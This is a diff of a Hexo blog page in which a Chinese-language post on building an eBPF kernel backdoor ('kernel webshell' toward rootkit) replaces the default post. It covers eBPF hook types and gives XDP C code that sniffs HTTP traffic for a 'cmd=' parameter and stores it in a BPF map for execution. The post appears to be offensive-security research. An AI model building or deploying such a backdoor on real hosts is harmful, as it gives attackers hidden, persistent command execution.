@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hello World, Hexo">
+    <meta name="keywords" content="从内存马到内核马到Rookit, Hexo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hello World | Hexo</title>
+    <title>从内存马到内核马到Rookit | Hexo</title>
     <link rel="icon" type="image/png" href="/huanhuan/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/huanhuan/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/huanhuan/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/huanhuan/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hello World</h1>
+                    <h1 class="description center-align post-title">从内存马到内核马到Rookit</h1>
                 </div>
             </div>
         </div>
@@ -464,19 +464,32 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+                <p>&emsp;之前写了两篇关于内存马的文章（没有更新到blog），从基本的中间件内存马原理的实现，到Agent注入，到线程型内存马的学习，再到最后实战的中的利用说的已经比较细致了；在本该结束这一个系列的时候突然看到了某位师傅在Github中提到的内核马，文章大概提到了该内核马是用ebpf技术实现的，提到了一下利用的思路和注意事项，由于之前也没接触过ebpf，加之师傅的文章也没写怎么实现，故有了此篇文章。</p>
+<p>PS：文章不会具体展开各项技术讲解，主要是讲一些涉及技术的关键点和后续马实现的思路。</p>
+<h3 id="ebpf基础（部分内容摘抄ebpf官方介绍）"><a href="#ebpf基础（部分内容摘抄ebpf官方介绍）" class="headerlink" title="ebpf基础（部分内容摘抄ebpf官方介绍）"></a>ebpf基础（部分内容摘抄ebpf官方介绍）</h3><p>&emsp;在聊内核马实现之前，先带大家了解一些前置技术-ebpf；ebpf是一种内核技术，它允许开发人员在不修改内核代码的情况下运行特定的功能进而实现用户态和内核态进行交互，进一步拓宽了其在操作系统内核中执行安全、高效程序的能力。<br><img src="https://github.com/w-lovezz/image/raw/main/Kernel.png"/><br>&emsp;Linux内核的主要目的是抽象化硬件或虚拟硬件，并提供一致的API（系统调用），使应用程序能够运行和共享资源。为了实现这一目标，内核由多个子系统组成，每个子系统负责不同的任务。子系统通常允许一定程度的配置以满足不同的用户需求。当所需的行为无法通过配置达成时，传统上有两种选择：一是修改内核源代码，此路径不仅耗时费力，还需历经社区审核；二是编写一个内核模块，虽相对灵活，但模块随内核迭代需定期修复。二者均非理想之选，前者成本高昂，后者牺牲了可移植性。</p>
+<p>&emsp;eBPF提供了一个新的选项，可以在不修改内核源代码或加载内核模块的情况下，重新编程Linux内核的行为，同时确保在不同内核版本间保持一定程度的行为一致性、兼容性和安全性。为此，eBPF程序也需要一个相应的API，允许用户定义的应用程序执行和共享资源。</p>
+<p>&emsp;ebpf提供百余辅助函数帮助开发者调试内核，会结合不同类型的内核钩子或事件触发器用于执行特定类型的操作或逻辑，如：</p>
+<ul>
+<li><font color="red">kprobe</font>：插探函数，在指定的内核函数前或后执行</li>
+<li><font color="red">tracepoint</font>：跟踪点函数，在指定的内核跟踪点处执行</li>
+<li><font color="red">raw_tracepoint</font>：原始跟踪点函数，在指定的内核原始跟踪点处执行</li>
+<li><font color="red">xdp</font>：网络数据处理函数，拦截和处理网络数据包</li>
+<li><font color="red">perf_event</font>：性能事件函数，用于处理内核性能事件</li>
+<li><font color="red">kretprobe</font>：函数返回插探函数，在指定的内核函数返回时执行</li>
+<li><font color="red">tracepoint_return</font>：跟踪点函数返回，在指定的内核跟踪点返回时执行</li>
+<li><font color="red">raw_tracepoint_return</font>：原始跟踪点函数返回，在指定的内核原始跟踪</li>
+</ul>
+<img src="https://github.com/w-lovezz/image/raw/main/hook.png"/>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>&emsp;图示可以看到，通过特定的ebpf代码，hook住内核的指定函数，以达到获取函数执行时的输入值&#x2F;返回值，篡改输入值&#x2F;返回值，达到执行开发者想替代的代码或返回开发者想让大家看到的值的目的。</p>
+<h3 id="内核马的实现"><a href="#内核马的实现" class="headerlink" title="内核马的实现"></a>内核马的实现</h3><p>&emsp;其实早在盘古实验室发表的《Bvp47美国NSA方程式的顶级后门》的文章，以及一些技术论早已披露了ebpf后门相关的内容，大家实现的方式也是大同小异；本文实现的后门主要有以下几个核心部分：</p>
+<h4 id="通过XDP获取攻击者想要执行的命令"><a href="#通过XDP获取攻击者想要执行的命令" class="headerlink" title="通过XDP获取攻击者想要执行的命令"></a>通过XDP获取攻击者想要执行的命令</h4><p>&emsp;XDP是Linux网络处理流程中的一个eBPF钩子，能够挂载eBPF程序，它能够在网络数据包到达网卡驱动层时对其进行处理；本文实现的后门通过Hook主机某网卡流量，解析协议获取特定的请求参数；</p>
+<p>解析请求流量，筛选为Http协议（可改造适配任何协议）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 确保以太网头部在数据包中</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">void</span> *)(eth + <span class="number">1</span>) &gt; data_end)</span><br><span class="line">        <span class="keyword">return</span> XDP_PASS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 跳过以太网头部到IP头部</span></span><br><span class="line">    ip = data + <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">void</span> *)(ip + <span class="number">1</span>) &gt; data_end)</span><br><span class="line">        <span class="keyword">return</span> XDP_PASS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只处理IPV4 TCP数据包</span></span><br><span class="line">    <span class="keyword">if</span> (ip-&gt;protocol != IPPROTO_TCP)</span><br><span class="line">        <span class="keyword">return</span> XDP_PASS;</span><br><span class="line"></span><br><span class="line">    ip_size = ip-&gt;ihl * <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">void</span> *)(ip + <span class="number">1</span>) + ip_size &gt; data_end)</span><br><span class="line">        <span class="keyword">return</span> XDP_PASS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 跳过IP头部到TCP头部</span></span><br><span class="line">    tcp = (<span class="type">void</span> *)ip + ip_size;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">void</span> *)(tcp + <span class="number">1</span>) &gt; data_end)</span><br><span class="line">        <span class="keyword">return</span> XDP_PASS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只处理目标端口为HTTP_PORT的数据包</span></span><br><span class="line">    <span class="keyword">if</span> (tcp-&gt;dest != htons(HTTP_PORT))</span><br><span class="line">        <span class="keyword">return</span> XDP_PASS;</span><br><span class="line"></span><br><span class="line">    tcp_size = tcp-&gt;doff * <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">void</span> *)(tcp + <span class="number">1</span>) + tcp_size &gt; data_end)</span><br><span class="line">        <span class="keyword">return</span> XDP_PASS;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *http_header_start = (<span class="type">void</span> *)tcp + tcp_size;</span><br><span class="line">    <span class="keyword">if</span> (http_header_start &gt;= data_end)</span><br><span class="line">        <span class="keyword">return</span> XDP_PASS; <span class="comment">// 确保HTTP头部起始点在数据包范围内</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>通过cmd关键字获取想要执行的命令</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_ITERATIONS &amp;&amp; (payload + i + <span class="number">4</span>) &lt; (<span class="type">const</span> <span class="type">char</span> *)data_end; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (payload[i] == <span class="string">&#x27;c&#x27;</span> &amp;&amp; payload[i+<span class="number">1</span>] == <span class="string">&#x27;m&#x27;</span> &amp;&amp; payload[i+<span class="number">2</span>] == <span class="string">&#x27;d&#x27;</span> &amp;&amp; payload[i+<span class="number">3</span>] == <span class="string">&#x27;=&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// Found the &quot;cmd=&quot; string</span></span><br><span class="line">            <span class="comment">//bpf_trace_printk(&quot;Found cmd parameter in HTTP request&quot;);</span></span><br><span class="line">            <span class="comment">// Move the pointer to the value part of &quot;cmd=&quot;</span></span><br><span class="line">            cmd_value_start = i + <span class="number">4</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//bpf_printk(&quot;payload value: %s&quot;,payload);</span></span><br><span class="line">            <span class="keyword">break</span>;  <span class="comment">// Exit after finding the first occurrence</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cmd_value_start != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i &lt; MAX_ITERATIONS &amp;&amp; (payload + cmd_value_start + i) &lt; (<span class="type">const</span> <span class="type">char</span> *)data_end ; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (payload[cmd_value_start + i] == <span class="string">&#x27; &#x27;</span> || payload[cmd_value_start + i] == <span class="string">&#x27;&amp;&#x27;</span>) &#123;</span><br><span class="line">                    cmd[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            cmd[i] = payload[cmd_value_start + i];</span><br><span class="line">            <span class="comment">//bpf_printk(&quot;cmd value: %s&quot;,cmd);</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        bpf_printk(<span class="string">&quot;cmd value: %s&quot;</span>,cmd);</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> key = <span class="number">0</span>; <span class="comment">// 只使用一个元素的数组，所以key可以是0</span></span><br><span class="line">        bpf_map_update_elem(&amp;cmd_map, &amp;key, cmd, BPF_ANY);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>效果如下：<br><img src="https://github.com/w-lovezz/image/raw/main/show.jpg"/></p>
 
                 
             </div>
@@ -503,7 +516,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://w-lovezz.github.io/huanhuan/huanhuan/2024/05/27/hello-world/">https://w-lovezz.github.io/huanhuan/huanhuan/2024/05/27/hello-world/</a>
+                    <a href="https://w-lovezz.github.io/huanhuan/huanhuan/2024/05/27/%E4%BB%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%B0%E5%86%85%E6%A0%B8%E9%A9%AC%E5%88%B0Rookit/">https://w-lovezz.github.io/huanhuan/huanhuan/2024/05/27/%E4%BB%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%B0%E5%86%85%E6%A0%B8%E9%A9%AC%E5%88%B0Rookit/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -708,10 +721,9 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;Current
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
                 <a href="/huanhuan/2024/05/27/hello-world/">
                     <div class="card-image">
@@ -729,9 +741,9 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-05-27
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-05-27
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -740,7 +752,6 @@
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
@@ -748,7 +759,7 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
+                Current&nbsp;<i class="far fa-dot-circle"></i>
             </div>
             <div class="card">
                 <a href="/huanhuan/2024/05/27/%E4%BB%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%B0%E5%86%85%E6%A0%B8%E9%A9%AC%E5%88%B0Rookit/">
@@ -778,6 +789,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
